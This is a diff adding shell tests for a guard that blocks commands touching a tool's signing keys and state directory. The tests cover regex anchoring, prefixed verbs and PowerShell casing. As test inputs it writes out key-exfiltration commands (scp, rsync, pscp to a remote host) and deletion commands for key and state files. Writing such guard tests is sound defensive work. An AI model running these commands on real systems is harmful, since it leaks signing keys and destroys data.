@@ -250,3 +250,70 @@ custody grant -key tracker -actions read -ttl 8h"
   run_guard "rm -rf ~/repos/delegate/keys"
   [ "$status" -eq 0 ]
 }
+
+@test "false positive: a verb hidden inside a word does not trip the rule" {
+  # "rm" inside "normalization" is not the rm verb. Without a leading boundary
+  # on the verb alternation, this denied a legitimate gate judge call whose
+  # -why text contained "normalization" followed by -state ~/dev/gate/state
+  # (2026-08-12).
+  run_guard 'gate judge -run run_abc -grant grt_x -why "score normalization applied" -state ~/dev/gate/state'
+  [ "$status" -eq 0 ]
+  run_guard 'gate gate -repo o/r -pr 5 -grant grt_x -state ~/dev/gate/state'
+  [ "$status" -eq 0 ]
+}
+
+@test "gate state: verb at start of command still blocked after boundary fix" {
+  run_guard "rm ~/dev/gate/keys/signing.key"
+  [ "$status" -eq 2 ]
+}
+
+@test "gate keys: remote copy verbs are blocked in their own right" {
+  # The unanchored regex blocked scp only by accident — `cp` matched inside it.
+  # Anchoring the verb costs that, so every remote-copy verb is listed
+  # explicitly; dropping one is a silent key-exfiltration path.
+  run_guard "scp ~/dev/gate/keys/signing.key host:/tmp/key"
+  [ "$status" -eq 2 ]
+  run_guard "rsync -a ~/dev/gate/keys/ host:/tmp/keys/"
+  [ "$status" -eq 2 ]
+  run_guard "rsync -a ~/dev/gate/state/ host:/tmp/state/"
+  [ "$status" -eq 2 ]
+}
+
+@test "gate keys: the PowerShell verb trio is complete" {
+  run_guard 'Copy-Item C:\Users\me\dev\gate\keys\signing.key C:\tmp\k'
+  [ "$status" -eq 2 ]
+  run_guard 'Move-Item C:\Users\me\dev\gate\keys\signing.key C:\tmp\k'
+  [ "$status" -eq 2 ]
+  run_guard 'Remove-Item C:\Users\me\dev\gate\state\log.jsonl'
+  [ "$status" -eq 2 ]
+}
+
+@test "gate keys: prefixed copy/delete clients are blocked, not just bare verbs" {
+  # The anchor's whole regression surface is verbs that do not start their
+  # token — these matched the unanchored regex via the embedded substring and
+  # would otherwise have silently lost coverage. Suffixed spellings never
+  # regressed (rmdir still matches via rm at the token start) and are asserted
+  # here so a future edit cannot quietly trade one for the other.
+  run_guard "rcp ~/dev/gate/keys/signing.key host:/tmp/k"
+  [ "$status" -eq 2 ]
+  run_guard 'pscp C:\Users\me\dev\gate\keys\signing.key host:/tmp/k'
+  [ "$status" -eq 2 ]
+  run_guard "srm ~/dev/gate/keys/signing.key"
+  [ "$status" -eq 2 ]
+  run_guard "rmdir ~/dev/gate/state"
+  [ "$status" -eq 2 ]
+}
+
+@test "gate keys: cmdlet casing does not change what is protected" {
+  # PowerShell cmdlet names and Windows paths are case-insensitive, so every
+  # spelling below invokes the same cmdlet against the same file. Evaluated
+  # case-sensitively, the rule protects one spelling and the rest walk the key.
+  run_guard 'copy-item C:\Users\me\dev\gate\keys\signing.key C:\tmp\k'
+  [ "$status" -eq 2 ]
+  run_guard 'COPY-ITEM C:\Users\me\dev\gate\keys\signing.key C:\tmp\k'
+  [ "$status" -eq 2 ]
+  run_guard 'remove-item C:\Users\me\dev\gate\state\log.jsonl'
+  [ "$status" -eq 2 ]
+  run_guard 'Move-Item C:\Users\me\dev\GATE\KEYS\signing.key C:\tmp\k'
+  [ "$status" -eq 2 ]
+}
